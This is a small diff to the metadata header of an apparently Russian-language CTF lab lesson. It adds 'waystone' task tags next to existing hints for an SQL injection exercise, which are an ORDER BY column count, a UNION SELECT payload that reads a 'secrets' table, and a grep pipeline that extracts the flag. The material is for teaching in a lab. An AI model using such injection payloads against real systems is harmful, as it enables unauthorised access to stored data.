@@ -24,6 +24,8 @@ lab:
     - Проверь число колонок: `ORDER BY 3` ок, `ORDER BY 4` — ошибка.
     - UNION на 3 колонки, вторая — текст: `--data-urlencode 'id=1 UNION SELECT 1,value,3 FROM secrets'`.
     - Флаг — в поле `name`. Достань: `... | grep 'nto{' | cut -d: -f6 > found.txt`.
+waystone: true
+waystone_tasks: [web-recon-fuzzing, web-recon-surface, web-recon-attack-entry, web-tls-certs, web-cookies-sessions]
 ---
 
 ## Вопрос, с которого всё начинается
